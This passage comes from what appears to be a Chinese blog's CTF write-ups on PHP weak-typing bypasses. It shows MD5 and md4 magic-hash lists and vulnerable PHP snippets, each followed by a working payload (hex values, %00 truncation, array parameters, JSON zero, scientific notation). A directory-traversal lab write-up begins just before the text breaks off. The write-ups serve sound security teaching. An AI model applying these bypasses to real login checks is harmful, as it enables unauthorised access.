class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure><h2 id="9-十六进制与数字比较"><a href="#9-十六进制与数字比较" class="headerlink" title="9. 十六进制与数字比较"></a>9. 十六进制与数字比较</h2><p><a href="http://123.206.87.240:9009/20.php">http://123.206.87.240:9009/20.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function">function <span class="title">noother_says_correct</span><span class="params">($temp)</span> </span>&#123;</span><br><span class="line">$flag = &#x27;flag&#123;test&#125;&#x27;;</span><br><span class="line">$one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line"><span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$number = &#x27;3735929054&#x27;;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="built_in">strlen</span>($number); $i++) &#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp &#123;$i&#125;);</span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;flase&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)</span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&#x27;password&#x27;];</span><br><span class="line"><span class="function">echo <span class="title">noother_says_correct</span><span class="params">($temp)</span></span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>参数不能有1-9的数字，同时要求该参数值为3735929054，所以把值转换成十六进制传参。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">0xdeadc0de</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102122943381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="10-ereg正则-00截断"><a href="#10-ereg正则-00截断" class="headerlink" title="10. ereg正则%00截断"></a>10. ereg正则%00截断</h2><p><a href="http://123.206.87.240:9009/5.php">http://123.206.87.240:9009/5.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;</span><br><span class="line">echo &#x27;You password must be alphanumeric&#x27;;</span><br><span class="line">&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;</span><br><span class="line">if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123;</span><br><span class="line">die(&#x27;Flag: &#x27; . $flag);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo(&#x27;have not been found&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo &#x27;Invalid password&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到”<em>-</em>“才能输出flag。</p><p>可以使用<code>%00</code>来截断，当ereg函数读到 <code>%00</code>的时候，就截止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">1e8</span>%<span class="number">00</span>*-*</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102124459121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="11-strpos数组绕过"><a href="#11-strpos数组绕过" class="headerlink" title="11. strpos数组绕过"></a>11. strpos数组绕过</h2><p><a href="http://123.206.87.240:9009/15.php">http://123.206.87.240:9009/15.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">if (isset ($_GET[&#x27;ctf&#x27;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE)</span><br><span class="line">     echo &#x27;必须输入数字才行&#x27;; </span><br><span class="line">else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)</span><br><span class="line">     die(&#x27;Flag: &#x27;.$flag); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">     echo &#x27;骚年，继续努力吧啊~&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>要求传入的参数为数字并且包含字符串“#biubiubiu”，有点难搞。</p><p>可以通过数组绕过<code>strpos</code>与<code>ereg</code>函数，遇到数组返回NULL，数值和类型相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?ctf[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102125444628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="12-数字验证正则绕过"><a href="#12-数字验证正则绕过" class="headerlink" title="12. 数字验证正则绕过"></a>12. 数字验证正则绕过</h2><p><a href="http://123.206.87.240:9009/21.php">http://123.206.87.240:9009/21.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = &#x27;flag&#123;test&#125;&#x27;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match — 执行一个正则表达式匹配 &#123;</span><br><span class="line">echo &#x27;flag&#x27;;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">$reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line">$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;);</span><br><span class="line"><span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line">foreach ($ps as $pt) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/[[:$pt:]]+/&quot;</span>, $password))</span><br><span class="line">$c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == $password) </span><br><span class="line">              echo $flag; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">              echo &#x27;Wrong password&#x27;;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码中涉及到的一些正则函数<br>| 正则匹配函数   | 描述                                                         | 区别                       |<br>| ————– | ———————————————————— | ————————– |<br>| preg_match     | 执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0       | 第一次匹配成功后就停止匹配 |<br>| preg_match_all | 执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中 | 匹配到字符串结束为止       |</p><p>下面还有几个正则匹配的字符：<br>| 正则匹配字符  | 描述 |ASCII|<br>|–|–|–|<br>| [:graph:] |除空格，TAB外的所有字符 |[\x21-\x7E]<br>|[a-zA-Z0-9]|大小写字母和数字 |[a-zA-Z0-9]<br>|[:alpha:]|大小写字母|    [a-zA-Z]|<br>| [:punct:] | 任何标点符号|[!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{} ~]|<br>| [:digit:] |任何数字 |[0-9]<br>| [:upper:] |任何大写字母 |[A-Z]<br>| [:lower:] |任何小写字母 |[a-z]</p><p>代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求方法必须为POST</span><br><span class="line"><span class="number">1</span>、正则匹配，[:graph:]为任意字符，要求password长度超过<span class="number">12</span></span><br><span class="line"><span class="number">2</span>、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过<span class="number">6</span>次</span><br><span class="line"><span class="number">3</span>、标点符号，数字，大写字母，小写字母，包含<span class="number">3</span>种以上绕过</span><br><span class="line"><span class="number">4</span>、弱类型比较，42abc,强制转换为数字</span><br></pre></td></tr></table></figure><p>构造Payload，居然提示<code>Wrong password</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: password=42BugKuctf.a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103190435176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>仔细看了一下代码，变量原来是flag，改一下Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: flag=42BugKuctf.a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020110318591559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这道题有点奇怪，随便post一个值也能得到flag，小小脑袋有大大疑问。<br><img src="https://img-blog.csdnimg.cn/20201103185441793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="13-md4绕过"><a href="#13-md4绕过" class="headerlink" title="13.md4绕过"></a>13.md4绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Theshy is locked&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中get进来的参数a，使<code>a=md4(a)</code>才行。</p><p>百度一下md4绕过，发现可以通过科学计算法比较绕过。找一个值是一个科学计算法0e开头的，其md4加密后也为0e开头，弱类型比较绕过。</p><table><thead><tr><th>a</th><th>md4(a)</th></tr></thead><tbody><tr><td>0e251288019</td><td>0e874956163641961271069404332409</td></tr><tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr><tr><td>Payload为：</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="number">0e251288019</span></span><br><span class="line">或</span><br><span class="line">?a=<span class="number">0e001233333333333334557778889</span></span><br></pre></td></tr></table></figure><h2 id="14-json绕过"><a href="#14-json绕过" class="headerlink" title="14.json绕过"></a>14.json绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0==”admin”这种形式绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: message=&#123;<span class="string">&quot;key&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="15-科学计数法绕过"><a href="#15-科学计数法绕过" class="headerlink" title="15.科学计数法绕过"></a>15.科学计数法绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;[a-zA-Z0-9]&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]) &lt; <span class="number">10</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>] &gt; <span class="number">987654321</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>], <span class="string">&#x27;#BIG#&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./flag.php&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations! FLAG is : &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计：</p><p>1.isset函数，POST传入参数login和yingzi。<br>2.strlen函数，参数yingzi的值长度小于10，且数值大于987654321。<br>3.strpos函数，参数yingzi的值是否匹配<code>#BIG#</code>，如果有，则包含一个flag.php文件，输出flag。</p><p>使用科学计数法绕过strlen函数，令yingzi=e9，此时strlen=3，为了匹配<code>#BIG#</code>，所以yingzi=1e9#BIG#</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: login=<span class="number">1</span>&amp;yingzi=<span class="number">1e9</span><span class="comment">#BIG#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201120107109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：PHP弱类型绕过方法&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="代码审计" scheme="https://swhat.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-信息泄露练习</title>
    <link href="https://swhat.github.io/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/</id>
    <published>2020-10-24T15:55:23.000Z</published>
    <updated>2021-04-04T14:02:30.030Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（一）</p> <a id="more"></a><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>访问网址，点击绿色按钮<br><img src="https://img-blog.csdnimg.cn/20201025170908376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后出现这样的页面<br><img src="https://img-blog.csdnimg.cn/20201025170931536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点进去发现都有四个子文件，既然题目是目录遍历，那我就一个个点进去看，最后在4/4目录下发现了flag.txt<br><img src="https://img-blog.csdnimg.cn/20201025171354476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开获得flag<br><img src="https://img-blog.csdnimg.cn/20201025171411952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" 